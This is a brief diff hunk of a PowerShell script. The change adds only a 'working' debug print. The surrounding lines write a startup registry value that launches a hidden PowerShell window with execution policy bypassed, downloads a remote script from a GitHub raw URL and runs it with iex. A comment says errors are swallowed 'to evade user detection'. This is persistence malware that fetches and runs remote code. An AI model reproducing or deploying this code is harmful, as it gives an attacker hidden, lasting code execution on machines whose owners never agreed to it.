@@ -67,6 +67,8 @@ try {
     $Value = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"iwr -useb 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex`"" 
     Set-ItemProperty -Path $RegPath -Name $Name -Value $Value
     
+    Write-Host "working"
+
 } catch {
     # Fail silently to evade user detection
 }
